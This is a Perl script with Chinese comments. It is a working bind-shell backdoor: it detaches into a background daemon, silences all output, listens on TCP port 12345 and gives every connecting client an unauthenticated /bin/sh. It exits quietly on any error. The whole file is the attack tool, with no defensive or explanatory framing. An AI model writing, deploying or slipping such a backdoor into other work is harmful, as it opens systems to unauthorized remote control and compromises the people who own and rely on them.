#!/usr/bin/perl
use strict;
use warnings;
use IO::Socket;
use POSIX qw(setsid);

# 成为守护进程
sub daemonize {
    my $pid = fork();
    exit if $pid;  # 父进程退出
    exit unless defined($pid);  # fork失败时安静退出

    setsid();  # 创建新的会话和进程组
    $pid = fork();  # 再次fork确保无法打开控制终端
    exit if $pid;  # 第一子进程退出
    exit unless defined($pid);  # fork失败时安静退出

    # 关闭标准输入输出和错误
    close STDIN;
    close STDOUT;
    close STDERR;
    # 重定向标准输入输出和错误到/dev/null
    open STDIN, '<', '/dev/null';
    open STDOUT, '>', '/dev/null';
    open STDERR, '>', '/dev/null';
}

# 处理客户端连接
sub handle_connection {
    my $client = shift;

    # 重定向STDIN, STDOUT, STDERR到客户端socket
    open STDIN, "<&", $client or exit 0;
    open STDOUT, ">&", $client or exit 0;
    open STDERR, ">&", $client or exit 0;

    # 执行shell
    exec '/bin/sh' or exit 0;
}

# 主程序开始
daemonize();

# 创建监听socket
my $socket = IO::Socket::INET->new(
    LocalPort => 12345,
    Type      => SOCK_STREAM,
    Reuse     => 1,
    Listen    => 10
) or exit 0;  # 监听失败时安静退出

while (1) {
    my $client = $socket->accept();  # 等待客户端连接
    next unless defined($client);
    
    my $pid = fork();  # 为每个连接创建子进程
    if ($pid == 0) {  # 子进程
        handle_connection($client);
        exit 0;
    }
    # 父进程继续监听，不等待子进程
}
